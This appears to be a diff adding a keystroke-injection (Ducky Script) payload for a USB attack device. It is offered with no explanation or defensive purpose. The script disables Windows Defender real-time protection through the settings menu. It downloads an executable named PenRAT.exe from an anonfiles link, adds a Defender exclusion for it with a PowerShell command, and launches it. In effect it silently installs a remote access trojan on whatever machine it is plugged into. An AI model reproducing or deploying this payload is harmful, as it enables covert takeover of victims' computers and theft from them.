@@ -1,0 +1,61 @@
+DELAY 500
+ALT F4
+DELAY 1000
+REM Open Windows Defender settings
+CTRL ESC
+DELAY 100
+STRING virus
+DELAY 250
+ENTER
+DELAY 2500
+REM Navigate to realtime protection and disable it
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+REM Close Settings
+DELAY 500
+ALT F4
+DELAY 750
+GUI r
+DELAY 100
+STRING Chrome https://cdn-145.anonfiles.com/e1f5X2seza/759c7681-1684832908/PenRAT.exe
+DELAY 1000
+TAB
+DELAY 80
+ENTER
+DELAY 80
+TAB
+DELAY 50
+ENTER
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\users\%username%\Downloads\PenRAT.exe"
+ENTER
+DELAY 1000
+GUI r
+DELAY 100
+STRING C:\users\%username%\Downloads\PenRAT.exe
+ENTER
+DELAY 150
+TAB
+DELAY 150
+ENTER
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+ENTER
+
